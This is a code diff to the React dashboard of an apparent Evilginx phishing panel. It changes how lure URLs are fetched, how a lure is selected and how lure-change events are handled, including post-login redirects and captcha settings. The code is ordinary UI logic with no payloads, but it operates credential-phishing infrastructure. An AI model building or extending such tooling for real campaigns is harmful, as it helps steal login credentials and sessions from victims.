@@ -202,7 +202,11 @@ export default function Dashboard() {
       try {
         // Also fetch all available lures
         const [linkResponse, luresResponse] = await Promise.all([
-          fetch("/api/full-link"),
+          fetch(
+            selectedLure
+              ? `/api/full-link?lureId=${selectedLure.id}`
+              : "/api/full-link"
+          ),
           fetch("/api/lures"),
         ]);
 
@@ -316,35 +320,59 @@ export default function Dashboard() {
   };
 
   const handleLureChange = async (lureId: string) => {
-    const selected = lures.find((lure) => lure.id === lureId);
-    if (selected) {
-      setSelectedLure(selected);
+    const selectedLureIndex = lures.findIndex((lure) => lure.id === lureId);
+    if (selectedLureIndex === -1) return;
 
-      // Update link settings with the selected lure path
-      try {
-        const response = await fetch("/api/link-settings", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            afterLoginRedirect: selected.redirect_url || "",
-            useCaptcha: selected.redirector === "main",
-            linkPath: selected.path.startsWith("/")
-              ? selected.path.substring(1)
-              : selected.path,
-          }),
-        });
+    const selected = lures[selectedLureIndex];
+    setSelectedLure(selected);
 
-        if (response.ok) {
-          // Refresh the full link after updating settings
-          fetchFullLink();
-          setError("Link updated successfully");
-          setTimeout(() => setError(null), 3000);
+    // Get the exact URL by calling the evilginx command through our API
+    try {
+      const lureUrlResponse = await fetch(
+        `/api/lure-url?lureIndex=${selectedLureIndex}`
+      );
+      if (lureUrlResponse.ok) {
+        const data = await lureUrlResponse.json();
+        if (data.url) {
+          setFullLink(data.url);
         }
-      } catch (error) {
-        console.error("Error updating link settings:", error);
       }
+    } catch (error) {
+      console.error("Error fetching lure URL:", error);
+      // Fall back to the API-based approach if the command fails
+      try {
+        const linkResponse = await fetch(`/api/full-link?lureId=${lureId}`);
+        if (linkResponse.ok) {
+          const data = await linkResponse.json();
+          setFullLink(data.fullUrl);
+        }
+      } catch (linkError) {
+        console.error("Error fetching updated link:", linkError);
+      }
+    }
+
+    // Update link settings with the selected lure path
+    try {
+      const response = await fetch("/api/link-settings", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          afterLoginRedirect: selected.redirect_url || "",
+          useCaptcha: selected.redirector === "main",
+          linkPath: selected.path.startsWith("/")
+            ? selected.path.substring(1)
+            : selected.path,
+        }),
+      });
+
+      if (response.ok) {
+        setError("Link updated successfully");
+        setTimeout(() => setError(null), 3000);
+      }
+    } catch (error) {
+      console.error("Error updating link settings:", error);
     }
   };
 
@@ -509,10 +537,69 @@ export default function Dashboard() {
     // Set up polling to check service status periodically
     const statusInterval = setInterval(fetchServiceStatus, 30000); // Every 30 seconds
 
+    // Add event listener for lure changes from settings page
+    const handleLureChangedEvent = (event: CustomEvent) => {
+      if (event.detail) {
+        const { lureId, lureIndex } = event.detail;
+        if (!lureId) return;
+
+        const selected = lures.find((lure) => lure.id === lureId);
+        if (!selected) return;
+
+        // Update selected lure
+        setSelectedLure(selected);
+
+        // If lureIndex is provided directly from the event, use it
+        const index =
+          typeof lureIndex === "number"
+            ? lureIndex
+            : lures.findIndex((lure) => lure.id === lureId);
+
+        if (index >= 0) {
+          // Get the exact URL by calling the evilginx command through our API
+          fetch(`/api/lure-url?lureIndex=${index}`)
+            .then((response) => {
+              if (response.ok) return response.json();
+              // If the lure-url API fails, fall back to the full-link API
+              throw new Error("Failed to fetch from lure-url API");
+            })
+            .then((data) => {
+              if (data.url) {
+                setFullLink(data.url);
+              }
+            })
+            .catch((error) => {
+              console.error("Error using lure-url API:", error);
+              // Fall back to the full-link API
+              fetch(`/api/full-link?lureId=${lureId}`)
+                .then((response) => {
+                  if (response.ok) return response.json();
+                  throw new Error("Failed to fetch link");
+                })
+                .then((data) => {
+                  setFullLink(data.fullUrl);
+                })
+                .catch((fallbackError) => {
+                  console.error("Error using fallback API:", fallbackError);
+                });
+            });
+        }
+      }
+    };
+
+    window.addEventListener(
+      "lureChanged",
+      handleLureChangedEvent as EventListener
+    );
+
     return () => {
       clearInterval(statusInterval);
+      window.removeEventListener(
+        "lureChanged",
+        handleLureChangedEvent as EventListener
+      );
     };
-  }, []);
+  }, [lures, fullLink]);
 
   const columns: TableColumn[] = [
     {
